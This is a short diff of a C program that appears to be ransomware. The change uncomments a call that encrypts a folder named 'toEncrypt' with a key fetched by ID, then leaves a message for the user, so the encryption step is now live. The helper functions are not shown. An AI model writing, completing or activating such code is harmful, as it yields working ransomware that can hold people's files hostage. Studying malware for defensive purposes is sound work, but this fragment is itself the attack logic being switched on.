@@ -12,7 +12,8 @@ int main (int argc, char **argv){
   char* key;
   key = getKey(ID);
   // encrypt the folder
-  // encDir("toEncrypt", key);
+  encDir("toEncrypt", key);
+  free(key);
   // leave a message to the user
   leaveExplanation();
   return 0;
